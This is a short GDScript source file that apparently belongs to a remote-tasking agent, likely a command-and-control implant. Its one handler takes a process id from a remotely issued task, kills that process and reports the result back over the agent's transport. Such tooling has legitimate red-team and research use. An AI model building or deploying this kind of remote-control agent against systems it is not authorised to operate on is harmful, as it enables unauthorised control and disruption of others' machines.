extends Node


func _on_tasking_kill(transport, task):
	var test_json_conv = JSON.new()
	test_json_conv.parse(task.get("parameters"))
	var parameters = test_json_conv.get_data()
	var status = OS.kill(parameters.get("pid"))
	var output = "Kill returned: %d" % status

	transport.send(
		transport.create_task_response(
			status == OK,
			true,
			task.get("id"),
			output
		)
	)
